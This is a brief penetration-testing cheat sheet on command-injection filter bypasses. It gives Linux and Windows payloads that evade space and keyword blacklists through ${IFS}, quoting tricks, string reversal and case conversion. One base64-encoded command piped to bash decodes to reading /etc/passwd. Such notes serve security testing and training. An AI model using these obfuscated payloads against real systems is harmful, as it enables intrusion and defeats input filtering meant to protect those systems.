# Command injection

# Space filter bypasses

Following bypasses might work if spaces are blocked:
- Use tabs instead of spaces (`%09`)
- For linux use env variable `${IFS}` which evaluates to a space and a tab in the default case
- Bash brace expansion: `{ls,-l}`

More bypasses are on this site: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

We can also extract illegal charachters from substring in env variables, like:
- echo ${PATH:0:1} -> `/` charachter
- echo ${LS_COLORS:10:1} -> `;` char

For windows something similar works:
- echo %HOMEPATH:~6,-11% -> `\` (cmd)
- $env:HOMEPATH[0] (powershell)
- $env:PROGRAMFILES[10] (powershell)

# Bypassing command filter
Sometimes certain keywords (for example `whoami`) are blacklisted... 
We can get around this by inserting charachters the shell typically ignores like `'`: `w'h'o'am'i` or `w"h"o"am"i` 
Other bypasses:
```
who$@ami
w\ho\am\i
```
Or on windows:
```
who^ami
```

If certain keywords in linux are blocked we can try to provide uppercase commands (maybe not on the blacklist) and convert them to lowercase like:
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
OR
$(a="WhOaMi";printf %s "${a,,}")
OR (inverting the command)
$(rev<<<'imaohw')
```

In powershell (inverting a command):
```
iex "$('imaohw'[-1..-20] -join '')"
```

Decode a base64 encoded command and pass it to bash:
```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
On windows:
```
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```